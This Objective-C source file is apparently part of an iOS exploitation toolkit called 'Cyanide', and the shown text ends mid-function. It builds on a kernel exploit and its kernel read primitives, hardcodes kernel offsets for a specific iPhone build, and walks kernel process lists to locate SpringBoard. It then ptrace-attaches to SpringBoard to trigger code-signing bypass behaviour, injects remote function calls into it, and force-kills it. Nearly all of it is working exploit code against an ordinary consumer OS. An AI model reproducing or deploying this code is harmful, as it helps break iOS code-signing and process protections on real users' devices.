#import <Foundation/Foundation.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import "CNDPhysicalCSAllowInvalidProbe.h"

#include <dlfcn.h>
#include <errno.h>
#include <mach/mach.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

extern int ptrace(int request, pid_t pid, caddr_t address, int data);

#ifndef CND_PHYSICAL_PROBE_ARMED
#define CND_PHYSICAL_PROBE_ARMED 0
#endif

#ifndef CND_PHYSICAL_PROBE_NONCE
#define CND_PHYSICAL_PROBE_NONCE "unconfigured"
#endif

/* Exact iPhone17,2 (iPhone 16 Pro Max) / 23A341 release-kernel facts. */
#define CND_EXPECTED_BUILD "23A341"
#define CND_UNSLID_KERNEL_BASE UINT64_C(0xfffffff007004000)
#define CND_CS_ALLOW_INVALID_OFFSET UINT64_C(0x016e2b68)
#define CND_PTRACE_ATTACHEXC_CALLS_OFFSET UINT64_C(0x0175d928)

#define CND_PT_ATTACHEXC 14
#define CND_PT_DETACH 11
#define CND_PT_KILL 8
#define CND_CS_OPS_STATUS 0
#define CND_CS_DEBUGGED UINT32_C(0x10000000)
#define CND_REMOTE_TIMEOUT_SECONDS 5

static const uint8_t kCNDCSAllowInvalidPrologue[] = {
    0x7f, 0x23, 0x03, 0xd5, /* pacibsp */
    0xe9, 0x23, 0xbb, 0x6d,
    0xf8, 0x5f, 0x01, 0xa9,
    0xf6, 0x57, 0x02, 0xa9,
    0xf4, 0x4f, 0x03, 0xa9,
    0xfd, 0x7b, 0x04, 0xa9,
    0xfd, 0x03, 0x01, 0x91,
    0xf3, 0x03, 0x00, 0xaa, /* mov x19, x0 */
};

static const uint32_t kCNDRXNonceCode[] = {
    UINT32_C(0xd503245f), /* bti c */
    UINT32_C(0xd2981bc0), /* mov x0, #0xc0de */
    UINT32_C(0xd65f03c0), /* ret */
};

typedef uint64_t (*CNDProcFindByNameFn)(const char *name);
typedef uint64_t (*CNDProcFindFn)(pid_t pid);
typedef uint64_t (*CNDProcSelfFn)(void);
typedef uint64_t (*CNDProcTaskFn)(uint64_t proc);
typedef char *(*CNDProcNameFn)(uint64_t proc);
typedef uint32_t (*CNDKRead32Fn)(uint64_t address);
typedef uint64_t (*CNDKReadPtrFn)(uint64_t address);
typedef void (*CNDKReadBufFn)(uint64_t address, void *buffer, uint64_t length);
typedef pid_t (*CNDResolveProcessPIDFn)(NSString *processName,
    NSError **error);
typedef int (*CNDKexploitFn)(void);
typedef bool (*CNDKRWReadyFn)(void);
typedef bool (*CNDKRWCleanupFn)(void);
typedef void (*CNDRemoteWithSessionFn)(id session, void (^block)(void));
typedef bool (*CNDRemoteSuccessFn)(void);
typedef uint64_t (*CNDRDlsymCallFn)(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);

typedef struct {
    pid_t pid;
    uint64_t proc;
    uint64_t task;
} CNDProbeTargetIdentity;

@interface CNDProbeRemoteCallSession : NSObject
@property(nonatomic, readonly) uint64_t taskAddr;
@property(nonatomic, readonly) int pid;
- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS;
- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
              originalThreadOnly:(BOOL)originalThreadOnly
            bootstrapThreadCount:(int)bootstrapThreadCount
               bootstrapProvoker:(void (^)(void))bootstrapProvoker;
- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                          functionAddress:(uint64_t)address
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7;
- (BOOL)remoteWrite:(uint64_t)destination
               from:(const void *)source
               size:(uint64_t)size;
- (BOOL)remoteRead:(uint64_t)source
                to:(void *)destination
              size:(uint64_t)size;
- (int)destroyRemoteCall;
- (void)abandonRemoteCall;
- (BOOL)hasLocalState;
- (BOOL)hasInFlightSyntheticCall;
- (BOOL)deferTeardownForInFlightSyntheticCall;
- (int)dispatchSelfSIGKILLForExpectedPID:(int)expectedPID
                                    proc:(uint64_t)expectedProc
                                    task:(uint64_t)expectedTask
                                  report:(void *)report;
@end

typedef struct {
    CNDProcFindByNameFn procFindByName;
    CNDProcFindFn procFind;
    CNDProcSelfFn procSelf;
    CNDProcTaskFn procTask;
    CNDProcNameFn procName;
    CNDKRead32Fn kread32;
    CNDKReadPtrFn kreadPtr;
    CNDKReadBufFn kreadbuf;
    CNDResolveProcessPIDFn resolveProcessPID;
    CNDKexploitFn kexploit;
    CNDKRWReadyFn krwReady;
    CNDKRWCleanupFn krwCleanup;
    CNDRemoteWithSessionFn withSession;
    CNDRemoteSuccessFn remoteSuccess;
    CNDRDlsymCallFn remoteDlsymCall;
    uint64_t *kernelBase;
    uint64_t *kernelSlide;
    uint64_t *remoteTargetProcOverride;
    uint32_t *procListNextOffset;
    uint32_t *procListPrevOffset;
    uint32_t *procPIDOffset;
    Class remoteSessionClass;
} CNDProbeAPI;

static NSMutableDictionary<NSString *, id> *gCNDReport;
static NSString *gCNDReportPath;
static CNDKRWCleanupFn gCNDKRWCleanup;
static bool gCNDKRWAcquisitionAttempted;
static bool gCNDProbeTerminateHostAfterRun;
static volatile int32_t gCNDProbeRunActive;
static uint32_t gCNDResolvedProcNameOffset;

static void CNDRecord(NSString *key, id value)
{
    if (!key || !value || !gCNDReport) return;
    @synchronized (gCNDReport) {
        gCNDReport[key] = value;
        gCNDReport[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
        NSData *data = [NSJSONSerialization dataWithJSONObject:gCNDReport
            options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
            error:nil];
        if (data && gCNDReportPath) {
            (void)[data writeToFile:gCNDReportPath
                options:NSDataWritingAtomic error:nil];
        }
    }
    NSLog(@"[CND_CS_INVALID] %@=%@", key, value);
}

static NSString *CNDHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static NSString *CNDOSBuild(void)
{
    char build[64] = {0};
    size_t size = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &size, NULL, 0) != 0 ||
        build[0] == '\0') return @"";
    return [NSString stringWithUTF8String:build] ?: @"";
}

static bool CNDKernelPointer(uint64_t value)
{
    return (value & UINT64_C(0xfffffff000000000)) ==
        UINT64_C(0xfffffff000000000);
}

static bool CNDResolveAPI(CNDProbeAPI *api)
{
    if (!api) return false;
    memset(api, 0, sizeof(*api));
#define CND_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(RTLD_DEFAULT, name)
    CND_RESOLVE(procFindByName, "proc_find_by_name");
    CND_RESOLVE(procFind, "proc_find");
    CND_RESOLVE(procSelf, "proc_self");
    CND_RESOLVE(procTask, "proc_task");
    CND_RESOLVE(procName, "proc_get_p_name");
    CND_RESOLVE(kread32, "kread32");
    CND_RESOLVE(kreadPtr, "kread_ptr");
    CND_RESOLVE(kreadbuf, "kreadbuf");
    CND_RESOLVE(resolveProcessPID,
        "CNDKernelTaskBridgeResolveProcessPID");
    CND_RESOLVE(kexploit, "kexploit_opa334");
    CND_RESOLVE(krwReady, "kexploit_krw_ready");
    CND_RESOLVE(krwCleanup, "kexploit_terminal_cleanup");
    CND_RESOLVE(withSession, "remote_call_with_session");
    CND_RESOLVE(remoteSuccess, "remote_call_current_success");
    CND_RESOLVE(remoteDlsymCall, "r_dlsym_call");
    CND_RESOLVE(kernelBase, "g_kernel_base");
    CND_RESOLVE(kernelSlide, "g_kernel_slide");
    CND_RESOLVE(remoteTargetProcOverride, "g_RC_targetProcOverride");
    CND_RESOLVE(procListNextOffset, "off_proc_p_list_le_next");
    CND_RESOLVE(procListPrevOffset, "off_proc_p_list_le_prev");
    CND_RESOLVE(procPIDOffset, "off_proc_p_pid");
#undef CND_RESOLVE
    api->remoteSessionClass = NSClassFromString(@"RemoteCallSession");
    return api->procFindByName && api->procFind && api->procSelf &&
        api->procTask && api->procName && api->kread32 && api->kreadPtr &&
        api->kreadbuf &&
        api->resolveProcessPID && api->kexploit && api->krwReady &&
        api->krwCleanup && api->withSession && api->remoteSuccess &&
        api->remoteDlsymCall && api->kernelBase && api->kernelSlide &&
        api->remoteTargetProcOverride && api->procListNextOffset &&
        api->procListPrevOffset && api->procPIDOffset &&
        api->remoteSessionClass;
}

static bool CNDMethodHasObjectABI(Method method, unsigned int arguments)
{
    if (!method || method_getNumberOfArguments(method) != arguments) {
        return false;
    }
    char type[16] = {0};
    method_getReturnType(method, type, sizeof(type));
    const char *baseType = type;
    while (*baseType && strchr("rnNoORV", *baseType)) baseType++;
    if (*baseType != '@') return false;
    for (unsigned int index = 2; index < arguments; index++) {
        memset(type, 0, sizeof(type));
        method_getArgumentType(method, index, type, sizeof(type));
        baseType = type;
        while (*baseType && strchr("rnNoORV", *baseType)) baseType++;
        if (index == 3) {
            if (*baseType != '^') return false;
        } else if (*baseType != '@') {
            return false;
        }
    }
    return true;
}

static pid_t CNDResolveSpringBoardPIDViaRunningBoard(void)
{
    void *framework = dlopen(
        "/System/Library/PrivateFrameworks/RunningBoardServices.framework/"
        "RunningBoardServices", RTLD_NOW | RTLD_LOCAL);
    if (!framework) {
        CNDRecord(@"runningBoardFrameworkAvailable", @NO);
        return 0;
    }
    Class predicateClass = NSClassFromString(@"RBSProcessPredicate");
    Class handleClass = NSClassFromString(@"RBSProcessHandle");
    SEL predicateSelector = NSSelectorFromString(
        @"predicateMatchingBundleIdentifier:");
    SEL handleSelector = NSSelectorFromString(@"handleForPredicate:error:");
    SEL pidSelector = NSSelectorFromString(@"pid");
    Method predicateMethod = predicateClass
        ? class_getClassMethod(predicateClass, predicateSelector) : NULL;
    Method handleMethod = handleClass
        ? class_getClassMethod(handleClass, handleSelector) : NULL;
    Method pidMethod = handleClass
        ? class_getInstanceMethod(handleClass, pidSelector) : NULL;
    CNDRecord(@"runningBoardPredicateTypeEncoding", predicateMethod
        ? [NSString stringWithUTF8String:method_getTypeEncoding(
            predicateMethod)] ?: @"" : @"");
    CNDRecord(@"runningBoardHandleTypeEncoding", handleMethod
        ? [NSString stringWithUTF8String:method_getTypeEncoding(
            handleMethod)] ?: @"" : @"");
    CNDRecord(@"runningBoardPIDTypeEncoding", pidMethod
        ? [NSString stringWithUTF8String:method_getTypeEncoding(pidMethod)]
            ?: @"" : @"");
    char pidReturn[16] = {0};
    if (pidMethod) method_getReturnType(pidMethod, pidReturn, sizeof(pidReturn));
    bool abi = CNDMethodHasObjectABI(predicateMethod, 3) &&
        CNDMethodHasObjectABI(handleMethod, 4) && pidMethod &&
        method_getNumberOfArguments(pidMethod) == 2 && pidReturn[0] == 'i';
    CNDRecord(@"runningBoardABIValidated", @(abi));
    if (!abi) return 0;

    id predicate = ((id (*)(id, SEL, id))objc_msgSend)(
        predicateClass, predicateSelector, @"com.apple.springboard");
    NSError *error = nil;
    id handle = predicate ?
        ((id (*)(id, SEL, id, NSError **))objc_msgSend)(
            handleClass, handleSelector, predicate, &error) : nil;
    pid_t pid = handle ?
        ((pid_t (*)(id, SEL))objc_msgSend)(handle, pidSelector) : 0;
    CNDRecord(@"runningBoardSpringBoardPID", @(pid));
    if (error) CNDRecord(@"runningBoardError", error.description ?: @"");
    return pid > 1 ? pid : 0;
}

typedef int (*CNDProcListAllPidsFn)(void *buffer, int bufferSize);
typedef int (*CNDProcNameUserFn)(int pid, void *buffer,
    uint32_t bufferSize);

static pid_t CNDResolveSpringBoardPIDViaLibproc(void)
{
    (void)dlopen("/usr/lib/libproc.dylib", RTLD_NOW | RTLD_LOCAL);
    CNDProcListAllPidsFn listAll = (CNDProcListAllPidsFn)dlsym(
        RTLD_DEFAULT, "proc_listallpids");
    CNDProcNameUserFn nameForPID = (CNDProcNameUserFn)dlsym(
        RTLD_DEFAULT, "proc_name");
    if (!listAll || !nameForPID) {
        CNDRecord(@"libprocAvailable", @NO);
        return 0;
    }

    pid_t pids[4096] = {0};
    errno = 0;
    int count = listAll(pids, (int)sizeof(pids));
    int listErrno = errno;
    CNDRecord(@"libprocPIDCount", @(count));
    CNDRecord(@"libprocListErrno", @(listErrno));
    if (count <= 0) return 0;
    if (count > (int)(sizeof(pids) / sizeof(pids[0]))) {
        count = (int)(sizeof(pids) / sizeof(pids[0]));
    }

    pid_t match = 0;
    unsigned int matches = 0;
    for (int index = 0; index < count; index++) {
        if (pids[index] <= 1) continue;
        char name[64] = {0};
        if (nameForPID(pids[index], name, sizeof(name)) > 0 &&
            strcmp(name, "SpringBoard") == 0) {
            match = pids[index];
            matches++;
        }
    }
    CNDRecord(@"libprocSpringBoardMatches", @(matches));
    CNDRecord(@"libprocSpringBoardPID", @(matches == 1 ? match : 0));
    return matches == 1 ? match : 0;
}

static pid_t CNDResolveSpringBoardPID(void)
{
    pid_t runningBoardPID = CNDResolveSpringBoardPIDViaRunningBoard();
    pid_t libprocPID = CNDResolveSpringBoardPIDViaLibproc();
    if (runningBoardPID > 1 && libprocPID > 1 &&
        runningBoardPID != libprocPID) {
        CNDRecord(@"springBoardPIDResolverDisagreement", @YES);
        return 0;
    }
    return runningBoardPID > 1 ? runningBoardPID : libprocPID;
}

static bool CNDReadInlineProcessName(const CNDProbeAPI *api,
    uint64_t proc, uint32_t nameOffset, char *nameOut,
    size_t nameCapacity)
{
    if (!api || !nameOffset || !nameOut || nameCapacity < 2 ||
        !CNDKernelPointer(proc)) return false;
    memset(nameOut, 0, nameCapacity);
    api->kreadbuf(proc + nameOffset, nameOut, nameCapacity - 1);
    nameOut[nameCapacity - 1] = '\0';
    size_t length = strnlen(nameOut, nameCapacity);
    if (length == 0 || length >= nameCapacity) return false;
    for (size_t index = 0; index < length; index++) {
        unsigned char byte = (unsigned char)nameOut[index];
        if (byte < 0x20 || byte > 0x7e) return false;
    }
    return true;
}

static bool CNDProcArrayContains(const uint64_t *procs, size_t count,
    uint64_t proc)
{
    for (size_t index = 0; index < count; index++) {
        if (procs[index] == proc) return true;
    }
    return false;
}

static size_t CNDCollectKernelProcs(const CNDProbeAPI *api,
    uint64_t anchor, uint64_t *procs, size_t capacity)
{
    if (!api || !procs || capacity == 0 ||
        !CNDKernelPointer(anchor)) return 0;
    size_t count = 0;
    const uint32_t links[] = {
        *api->procListNextOffset,
        *api->procListPrevOffset,
    };
    for (unsigned int direction = 0;
         direction < sizeof(links) / sizeof(links[0]); direction++) {
        uint64_t candidate = anchor;
        for (size_t index = 0;
             index < capacity && CNDKernelPointer(candidate); index++) {
            bool alreadySeen = CNDProcArrayContains(procs, count, candidate);
            if (candidate != anchor && alreadySeen) break;
            if (!alreadySeen) procs[count++] = candidate;

            uint64_t next = api->kreadPtr(candidate + links[direction]);
            if (!CNDKernelPointer(next) || next == candidate ||
                next == anchor) break;
            candidate = next;
        }
    }
    return count;
}

static bool CNDResolveSpringBoardIdentityViaKernel(
    const CNDProbeAPI *api, CNDProbeTargetIdentity *identityOut)
{
    if (!api || !identityOut) return false;
    memset(identityOut, 0, sizeof(*identityOut));

    uint64_t anchor = api->procSelf();
    pid_t selfKernelPID = CNDKernelPointer(anchor)
        ? (pid_t)api->kread32(anchor + *api->procPIDOffset) : 0;
    CNDRecord(@"kernelProcWalkSelfProc", CNDHex(anchor));
    CNDRecord(@"kernelProcWalkSelfPID", @(selfKernelPID));
    bool selfPIDValidated = CNDKernelPointer(anchor) &&
        selfKernelPID == getpid();
    CNDRecord(@"kernelProcWalkPIDOffsetValidated", @(selfPIDValidated));
    if (!selfPIDValidated) return false;

    uint64_t procs[4096] = {0};
    size_t procCount = CNDCollectKernelProcs(
        api, anchor, procs, sizeof(procs) / sizeof(procs[0]));
    CNDRecord(@"kernelProcWalkVisited", @(procCount));
    if (procCount < 2) return false;

    uint64_t launchdProc = 0;
    unsigned int launchdPIDMatches = 0;
    for (size_t index = 0; index < procCount; index++) {
        if ((pid_t)api->kread32(
                procs[index] + *api->procPIDOffset) == 1) {
            launchdProc = procs[index];
            launchdPIDMatches++;
        }
    }
    CNDRecord(@"kernelProcWalkLaunchdPIDMatches", @(launchdPIDMatches));
    CNDRecord(@"kernelProcWalkLaunchdProc", CNDHex(launchdProc));
    if (launchdPIDMatches != 1 || !CNDKernelPointer(launchdProc)) {
        return false;
    }

    enum { CND_PROC_SCAN_SIZE = 0x800 };
    uint8_t selfBytes[CND_PROC_SCAN_SIZE] = {0};
    api->kreadbuf(anchor, selfBytes, sizeof(selfBytes));
    const char selfName[] = "Cyanide";
    NSMutableArray<NSString *> *validatedOffsets = [NSMutableArray array];
    uint32_t selectedOffset = 0;
    uint64_t matchProc = 0;
    pid_t matchPID = 0;
    bool ambiguous = false;
    for (uint32_t offset = 0;
         offset + sizeof(selfName) <= sizeof(selfBytes); offset++) {
        if (memcmp(selfBytes + offset, selfName, sizeof(selfName)) != 0) {
            continue;
        }
        char launchdName[32] = {0};
        if (!CNDReadInlineProcessName(api, launchdProc, offset,
                launchdName, sizeof(launchdName)) ||
            strcmp(launchdName, "launchd") != 0) {
            continue;
        }

        uint64_t offsetMatchProc = 0;
        pid_t offsetMatchPID = 0;
        unsigned int offsetMatches = 0;
        for (size_t index = 0; index < procCount; index++) {
            char processName[32] = {0};
            pid_t processPID = (pid_t)api->kread32(
                procs[index] + *api->procPIDOffset);
            if (processPID > 1 && CNDReadInlineProcessName(
                    api, procs[index], offset, processName,
                    sizeof(processName)) &&
                strcmp(processName, "SpringBoard") == 0) {
                offsetMatchProc = procs[index];
                offsetMatchPID = processPID;
                offsetMatches++;
            }
        }
        if (offsetMatches != 1) continue;
        [validatedOffsets addObject:CNDHex(offset)];
        if (!selectedOffset) {
            selectedOffset = offset;
            matchProc = offsetMatchProc;
            matchPID = offsetMatchPID;
        } else if (matchProc != offsetMatchProc ||
                   matchPID != offsetMatchPID) {
            ambiguous = true;
        }
    }

    CNDRecord(@"kernelProcWalkValidatedNameOffsets", validatedOffsets);
    CNDRecord(@"kernelProcWalkNameOffsetAmbiguous", @(ambiguous));
    CNDRecord(@"kernelProcWalkSelectedNameOffset", CNDHex(selectedOffset));
    CNDRecord(@"kernelProcWalkSpringBoardProc", CNDHex(matchProc));
    CNDRecord(@"kernelProcWalkSpringBoardPID", @(matchPID));
    if (!selectedOffset || ambiguous || matchPID <= 1 ||
        !CNDKernelPointer(matchProc)) return false;

    uint64_t task = api->procTask(matchProc);
    char processName[32] = {0};
    bool exact = CNDKernelPointer(task) &&
        (pid_t)api->kread32(matchProc + *api->procPIDOffset) == matchPID &&
        CNDReadInlineProcessName(api, matchProc, selectedOffset,
            processName, sizeof(processName)) &&
        strcmp(processName, "SpringBoard") == 0;
    CNDRecord(@"kernelProcWalkSpringBoardTask", CNDHex(task));
    CNDRecord(@"kernelProcWalkIdentityVerified", @(exact));
    if (!exact) return false;

    gCNDResolvedProcNameOffset = selectedOffset;
    identityOut->pid = matchPID;
    identityOut->proc = matchProc;
    identityOut->task = task;
    return true;
}

static uint64_t CNDDecodeBLTarget(uint64_t instructionAddress,
    uint32_t instruction)
{
    if ((instruction & UINT32_C(0xfc000000)) != UINT32_C(0x94000000)) {
        return 0;
    }
    int64_t displacement = (int64_t)(instruction & UINT32_C(0x03ffffff));
    if ((displacement & INT64_C(0x02000000)) != 0) {
        displacement |= ~INT64_C(0x03ffffff);
    }
    displacement <<= 2;
    return (uint64_t)((int64_t)instructionAddress + displacement);
}

static bool CNDVerifyExactKernel(const CNDProbeAPI *api)
{
    if (!api || !api->kernelBase || !api->kernelSlide ||
        !CNDKernelPointer(*api->kernelBase)) return false;
    uint64_t expectedBase = CND_UNSLID_KERNEL_BASE + *api->kernelSlide;
    if (*api->kernelBase != expectedBase) {
        CNDRecord(@"kernelIdentityFailure", [NSString stringWithFormat:
            @"base %@ does not equal unslid+slide %@",
            CNDHex(*api->kernelBase), CNDHex(expectedBase)]);
        return false;
    }

    uint64_t function = *api->kernelBase + CND_CS_ALLOW_INVALID_OFFSET;
    uint8_t prologue[sizeof(kCNDCSAllowInvalidPrologue)] = {0};
    api->kreadbuf(function, prologue, sizeof(prologue));
    if (memcmp(prologue, kCNDCSAllowInvalidPrologue, sizeof(prologue)) != 0) {
        CNDRecord(@"kernelIdentityFailure",
            @"cs_allow_invalid prologue mismatch");
        return false;
    }

    uint64_t calls = *api->kernelBase + CND_PTRACE_ATTACHEXC_CALLS_OFFSET;
    uint32_t words[5] = {0};
    api->kreadbuf(calls, words, sizeof(words));
    bool callShape = words[0] == UINT32_C(0xaa1303e0) &&
        words[2] == UINT32_C(0xaa1503e0) &&
        CNDDecodeBLTarget(calls + 4, words[1]) == function &&
        CNDDecodeBLTarget(calls + 12, words[3]) == function &&
        words[4] == UINT32_C(0xaa1303e0);
    if (!callShape) {
        CNDRecord(@"kernelIdentityFailure",
            @"PT_ATTACHEXC callsites do not resolve to cs_allow_invalid");
        return false;
    }
    CNDRecord(@"ptraceAttachAllowsTargetAndTracer", @YES);
    CNDRecord(@"csAllowInvalidRuntimeAddress", CNDHex(function));
    CNDRecord(@"kernelIdentityVerified", @YES);
    return true;
}

static bool CNDIdentityMatches(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask)
{
    if (!api || pid <= 1 || !expectedProc || !expectedTask) return false;
    uint64_t proc = api->procFind(pid);
    const char *name = proc ? api->procName(proc) : NULL;
    return proc == expectedProc && api->procTask(proc) == expectedTask &&
        name && strcmp(name, "SpringBoard") == 0;
}

static CNDProbeRemoteCallSession *CNDCreateSpringBoardSession(
    const CNDProbeAPI *api, uint64_t expectedProc)
{
    if (!api || !api->remoteTargetProcOverride ||
        !CNDKernelPointer(expectedProc)) return nil;

    CNDProbeRemoteCallSession *session = nil;
    *api->remoteTargetProcOverride = expectedProc;
    @try {
        session = [[(id)api->remoteSessionClass alloc]
            initWithProcess:@"SpringBoard"
            useMigFilterBypass:NO
            firstExceptionTimeoutMS:10000];
    } @finally {
        /* The physical initializer consumes this one-shot override. Clear it
         * defensively if construction stopped before reaching that point. */
        *api->remoteTargetProcOverride = 0;
    }
    return session;
}

static bool CNDReadTargetCSFlagsRemote(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask, uint32_t *flagsOut)
{
    if (!api || !flagsOut ||
        !CNDIdentityMatches(api, pid, expectedProc, expectedTask)) return false;
    *flagsOut = 0;
    CNDProbeRemoteCallSession *session = CNDCreateSpringBoardSession(
        api, expectedProc);
    if (!session) return false;
    bool bound = session.pid == pid && session.taskAddr == expectedTask &&
        CNDIdentityMatches(api, pid, expectedProc, expectedTask);
    __block bool read = false;
    if (bound) {
        @try {
            api->withSession(session, ^{
                uint64_t status = api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "malloc", sizeof(uint32_t),
                    0, 0, 0, 0, 0, 0, 0);
                if (!status || !api->remoteSuccess()) return;
                (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                    "memset", status, 0, sizeof(uint32_t), 0, 0, 0, 0, 0);
                int64_t result = (int64_t)api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "csops", (uint64_t)pid,
                    CND_CS_OPS_STATUS, status, sizeof(uint32_t), 0, 0, 0, 0);
                read = result == 0 && api->remoteSuccess() &&
                    [session remoteRead:status to:flagsOut
                        size:sizeof(*flagsOut)];
                if (api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                        "free", status, 0, 0, 0, 0, 0, 0, 0);
                }
            });
        } @catch (NSException *exception) {
            CNDRecord(@"csStatusRemoteException",
                [NSString stringWithFormat:@"%@:%@",
                    exception.name ?: @"exception",
                    exception.reason ?: @"unknown"]);
        }
    }
    if ([session hasInFlightSyntheticCall]) {
        (void)[session deferTeardownForInFlightSyntheticCall];
    } else if ([session hasLocalState]) {
        (void)[session destroyRemoteCall];
    }
    return read && ![session hasLocalState];
}

static bool CNDWaitForStop(pid_t pid, int *statusOut)
{
    for (unsigned int attempt = 0; attempt < 60; attempt++) {
        int status = 0;
        pid_t result = waitpid(pid, &status, WNOHANG | WUNTRACED);
        if (result == pid) {
            if (statusOut) *statusOut = status;
            return WIFSTOPPED(status);
        }
        if (result < 0) return false;
        usleep(50000);
    }
    return false;
}

static bool CNDWaitForIdentityExit(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask)
{
    for (unsigned int attempt = 0; attempt < 100; attempt++) {
        if (!CNDIdentityMatches(
                api, pid, expectedProc, expectedTask)) return true;
        usleep(50000);
    }
    return false;
}

static bool CNDForceSpringBoardRestart(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask)
{
    if (!CNDIdentityMatches(
            api, pid, expectedProc, expectedTask)) return true;
    errno = 0;
    int signalResult = kill(pid, SIGKILL);
    CNDRecord(@"fallbackSpringBoardKillResult", @(signalResult));
    CNDRecord(@"fallbackSpringBoardKillErrno", @(errno));
    if (signalResult == 0 && CNDWaitForIdentityExit(
            api, pid, expectedProc, expectedTask)) {
        return true;
    }

    errno = 0;
    int attach = ptrace(CND_PT_ATTACHEXC, pid, NULL, 0);
    CNDRecord(@"fallbackSpringBoardReattachResult", @(attach));
    CNDRecord(@"fallbackSpringBoardReattachErrno", @(errno));
    if (attach == 0) {
        int status = 0;
        if (CNDWaitForStop(pid, &status)) {
            errno = 0;
            int killResult = ptrace(CND_PT_KILL, pid, NULL, 0);
            CNDRecord(@"fallbackSpringBoardPtraceKillResult", @(killResult));
            CNDRecord(@"fallbackSpringBoardPtraceKillErrno", @(errno));
        }
    }
    return CNDWaitForIdentityExit(
        api, pid, expectedProc, expectedTask);
}

static bool CNDEnableThroughAttach(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask)
{
    errno = 0;
    int attach = ptrace(CND_PT_ATTACHEXC, pid, NULL, 0);
    int attachErrno = errno;
    CNDRecord(@"ptraceAttachResult", @(attach));
    CNDRecord(@"ptraceAttachErrno", @(attachErrno));
    if (attach != 0) return false;
    CNDRecord(@"ptraceAttachAccepted", @YES);
    CNDRecord(@"springBoardResetRequired", @YES);
    CNDRecord(@"cyanideTerminationRequired", @YES);
    gCNDProbeTerminateHostAfterRun = true;

    int waitStatus = 0;
    bool stopped = CNDWaitForStop(pid, &waitStatus);
    CNDRecord(@"ptraceStopObserved", @(stopped));
    CNDRecord(@"ptraceWaitStatus", @(waitStatus));
    if (!stopped || !CNDIdentityMatches(api, pid, expectedProc, expectedTask)) {
        CNDRecord(@"result", @"failed-after-attach-before-detach");
        CNDRecord(@"state", @"result-persisted-before-springboard-reset");
        errno = 0;
        int killResult = ptrace(CND_PT_KILL, pid, NULL, 0);
        CNDRecord(@"ptraceEmergencyKillResult", @(killResult));
        CNDRecord(@"ptraceEmergencyKillErrno", @(errno));
        bool reset = CNDWaitForIdentityExit(
            api, pid, expectedProc, expectedTask);
        CNDRecord(@"springBoardFinalResetProven", @(reset));
        return false;
    }

    errno = 0;
    int detach = ptrace(CND_PT_DETACH, pid, (caddr_t)(uintptr_t)1, 0);
    int detachErrno = errno;
    CNDRecord(@"ptraceDetachResult", @(detach));
    CNDRecord(@"ptraceDetachErrno", @(detachErrno));
    if (detach != 0) {
        CNDRecord(@"result", @"failed-detach-after-accepted-attach");
        CNDRecord(@"state", @"result-persisted-before-springboard-reset");
        errno = 0;
        int killResult = ptrace(CND_PT_KILL, pid, NULL, 0);
        CNDRecord(@"ptraceEmergencyKillResult", @(killResult));
        CNDRecord(@"ptraceEmergencyKillErrno", @(errno));
        bool reset = CNDWaitForIdentityExit(
            api, pid, expectedProc, expectedTask);
        CNDRecord(@"springBoardFinalResetProven", @(reset));
        return false;
    }
    bool identity = CNDIdentityMatches(api, pid, expectedProc, expectedTask);
    if (!identity) {
        CNDRecord(@"result", @"failed-springboard-changed-after-detach");
        CNDRecord(@"springBoardFinalResetProven", @YES);
    }
    return identity;
}

static bool CNDTerminateSpringBoardSession(const CNDProbeAPI *api,
    CNDProbeRemoteCallSession *session, pid_t pid, uint64_t proc,
    uint64_t task)
{
    bool exited = !CNDIdentityMatches(api, pid, proc, task);
    int dispatch = 0;
    if (!exited && [session hasLocalState]) {
        dispatch = [session dispatchSelfSIGKILLForExpectedPID:pid
            proc:proc task:task report:NULL];
        exited = CNDWaitForIdentityExit(api, pid, proc, task);
    }
    CNDRecord(@"springBoardTerminalDispatch", @(dispatch));
    CNDRecord(@"springBoardExitProven", @(exited));
    if (exited) {
        [session abandonRemoteCall];
    } else if (![session hasInFlightSyntheticCall]) {
        (void)[session destroyRemoteCall];
    }
    CNDRecord(@"remoteSessionClosed", @(![session hasLocalState]));
    return exited;
}

static bool CNDRunRXNonce(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask,
    bool *debuggedObservedOut, bool *resetOut)
{
    if (debuggedObservedOut) *debuggedObservedOut = false;
    if (resetOut) *resetOut = false;
    CNDProbeRemoteCallSession *session = CNDCreateSpringBoardSession(
        api, expectedProc);
    if (!session) {
        CNDRecord(@"remoteCallFailure", @"could not open SpringBoard session");
        CNDRecord(@"result", @"failed-springboard-remotecall-unavailable");
        bool reset = CNDForceSpringBoardRestart(
            api, pid, expectedProc, expectedTask);
        CNDRecord(@"springBoardFinalResetProven", @(reset));
